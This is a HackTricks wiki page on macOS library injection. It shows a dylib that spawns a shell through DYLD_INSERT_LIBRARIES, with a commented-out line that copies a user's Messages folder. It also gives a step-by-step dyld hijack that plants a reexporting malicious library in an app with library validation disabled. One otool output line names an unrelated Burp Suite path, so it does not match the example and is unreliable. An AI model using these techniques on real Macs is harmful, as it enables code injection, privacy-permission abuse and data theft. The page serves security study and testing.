---
title: "macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## DYLD_INSERT_LIBRARIES Basic example

**Library to inject** to execute a shell:

```
// gcc -dynamiclib -o inject.dylib inject.c
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
    printf("[+] dylib injected in %s\n", argv[0]);
    execv("/bin/bash", 0);
    //system("cp -r ~/Library/Messages/ /tmp/Messages/");
}
```
Binary to attack:

```
// gcc hello.c -o hello
#include <stdio.h>
int main()
{
    printf("Hello, World!\n");
    return 0;
}
```
Injection:

```
DYLD_INSERT_LIBRARIES=inject.dylib ./hello
```
## Dyld Hijacking Example

The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

```
codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
```
**[...]com.apple.security.cs.disable-library-validation[...]**
With the previous info we know that it’s **not checking the signature of the loaded libraries** and it’s **trying to load a library from**:

- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`

However, the first one doesn’t exist:

```
pwd
/Applications/VulnDyld.app
find ./ -name lib.dylib
./Contents/Resources/lib2/lib.dylib
```
So, it’s possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:

```
#import <Foundation/Foundation.h>
__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"[+] dylib hijacked in %s", argv[0]);
}
```
Compile it:

```
gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
# Note the versions and the reexport
```
The reexport path created in the library is relative to the loader, lets change it for an absolute path to the library to export:

```
#Check relative
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
         cmd LC_REEXPORT_DYLIB
         cmdsize 48
         name @rpath/libjli.dylib (offset 24)
#Change the location of the library absolute to absolute path
install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib
# Check again
otool -l /tmp/lib.dylib| grep REEXPORT -A 2
          cmd LC_REEXPORT_DYLIB
      cmdsize 128
         name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
```
Finally just copy it to the **hijacked location**:

```
cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
```
And **execute** the binary and check the **library was loaded**:

```
"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
```
**2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary**
Usage: [...]

A nice writeup about how to abuse this vulnerability to abuse the camera permissions of telegram can be found in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) [\[1\]](#references)

## Bigger Scale

If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` execution).

```
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
```
## References
